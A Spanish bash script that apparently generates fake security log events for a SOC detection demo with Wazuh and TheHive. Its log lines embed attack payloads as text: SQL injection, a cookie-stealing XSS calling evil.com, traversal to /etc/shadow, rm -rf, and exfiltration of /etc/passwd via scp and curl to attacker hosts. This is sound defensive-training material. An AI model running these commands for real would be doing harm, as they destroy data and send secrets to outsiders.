#!/bin/bash

# Script de simulación de ataques para CyberSOC
# Genera eventos de seguridad para demostrar capacidades de detección

echo "==================================="
echo "  CyberSOC - Simulador de Ataques"
echo "==================================="
echo ""

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Función para simular ataque
simulate_attack() {
    local attack_name=$1
    local command=$2
    
    echo -e "${YELLOW}[*] Simulando: ${attack_name}${NC}"
    eval "$command"
    echo -e "${GREEN}[✓] Completado${NC}"
    echo ""
    sleep 2
}

# Menu principal
echo "Selecciona el tipo de ataque a simular:"
echo ""
echo "1. Ataque de Fuerza Bruta SSH"
echo "2. SQL Injection"
echo "3. XSS (Cross-Site Scripting)"
echo "4. Path Traversal"
echo "5. Comando Destructivo"
echo "6. Escalada de Privilegios"
echo "7. Escaneo de Puertos"
echo "8. Proceso Sospechoso"
echo "9. Exfiltración de Datos"
echo "10. Instalación de Software"
echo "11. Todos los ataques (Demo completa)"
echo "0. Salir"
echo ""
read -p "Opción: " option

case $option in
    1)
        simulate_attack "Ataque de Fuerza Bruta SSH" \
        "for i in {1..10}; do docker exec syslog-client logger -p auth.warning -t sshd 'Failed password for admin from 192.168.1.100 port 22 ssh2'; sleep 1; done"
        ;;
    2)
        simulate_attack "SQL Injection" \
        "docker exec syslog-client logger -t apache 'GET /login.php?id=1\\' OR \\'1\\'=\\'1 HTTP/1.1 - SQL Injection attempt'"
        ;;
    3)
        simulate_attack "XSS Attack" \
        "docker exec syslog-client logger -t apache 'GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1 - XSS attempt'"
        ;;
    4)
        simulate_attack "Path Traversal" \
        "docker exec syslog-client logger -t apache 'GET /files?path=../../etc/passwd HTTP/1.1 - Path traversal attempt'"
        ;;
    5)
        simulate_attack "Comando Destructivo" \
        "docker exec syslog-client logger -t bash 'User root executed: rm -rf /important/data'"
        ;;
    6)
        simulate_attack "Escalada de Privilegios" \
        "docker exec syslog-client logger -p auth.info -t su 'User hacker changed to root successfully'"
        ;;
    7)
        simulate_attack "Escaneo de Puertos" \
        "for port in 22 80 443 3306 5432 8080; do docker exec syslog-client logger -t firewall 'Connection attempt from 10.0.0.50 to port '\$port; sleep 0.5; done"
        ;;
    8)
        simulate_attack "Proceso Sospechoso" \
        "docker exec syslog-client logger -t kernel 'Process started: /tmp/cryptominer --pool malicious.com'"
        ;;
    9)
        simulate_attack "Exfiltración de Datos" \
        "docker exec syslog-client logger -t bash 'User executed: scp /etc/passwd attacker@external.com:/tmp/'"
        ;;
    10)
        simulate_attack "Instalación de Software" \
        "docker exec syslog-client logger -t apt 'User executed: apt install netcat-traditional'"
        ;;
    11)
        echo -e "${RED}[!] Ejecutando TODOS los ataques - Demo Completa${NC}"
        echo ""
        
        simulate_attack "1/10 - Ataque de Fuerza Bruta SSH" \
        "for i in {1..15}; do docker exec syslog-client logger -p auth.warning -t sshd 'Failed password for admin from 10.0.0.50 port 22 ssh2'; sleep 1; done"
        
        simulate_attack "2/10 - SQL Injection" \
        "docker exec syslog-client logger -t apache 'GET /login.php?id=1\\' UNION SELECT * FROM users-- HTTP/1.1'"
        
        simulate_attack "3/10 - XSS Attack" \
        "docker exec syslog-client logger -t apache 'GET /comment?text=<script>document.location=\\'http://evil.com\\'+document.cookie</script> HTTP/1.1'"
        
        simulate_attack "4/10 - Path Traversal" \
        "docker exec syslog-client logger -t apache 'GET /download?file=../../../../etc/shadow HTTP/1.1'"
        
        simulate_attack "5/10 - Comando Destructivo" \
        "docker exec syslog-client logger -t bash 'User www-data executed: rm -rf /var/www/html/*'"
        
        simulate_attack "6/10 - Escalada de Privilegios" \
        "docker exec syslog-client logger -p auth.notice -t sudo 'User www-data executed /bin/bash as root'"
        
        simulate_attack "7/10 - Escaneo de Puertos" \
        "for port in 21 22 23 25 80 443 3389 8080; do docker exec syslog-client logger -t firewall 'SYN packet from 203.0.113.50 to port '\$port; sleep 0.3; done"
        
        simulate_attack "8/10 - Proceso Sospechoso" \
        "docker exec syslog-client logger -t kernel 'Suspicious process: /tmp/.hidden/miner --cpu 100%'"
        
        simulate_attack "9/10 - Exfiltración de Datos" \
        "docker exec syslog-client logger -t bash 'User backup executed: curl -X POST -d @/etc/passwd http://attacker.com/exfil'"
        
        simulate_attack "10/10 - Instalación No Autorizada" \
        "docker exec syslog-client logger -t dpkg 'Installed: nmap netcat tor'"
        
        echo -e "${GREEN}[✓✓✓] Demo completa finalizada${NC}"
        echo -e "${YELLOW}[*] Revisa Wazuh Dashboard para ver las alertas${NC}"
        ;;
    0)
        echo "Saliendo..."
        exit 0
        ;;
    *)
        echo -e "${RED}[!] Opción inválida${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${GREEN}==================================="
echo "  Simulación completada"
echo "===================================${NC}"
echo ""
echo "Próximos pasos:"
echo "1. Accede a Wazuh Dashboard: https://localhost:5601"
echo "2. Ve a Security Events para ver las alertas"
echo "3. Crea un incidente en TheHive: http://localhost:9000"
echo ""
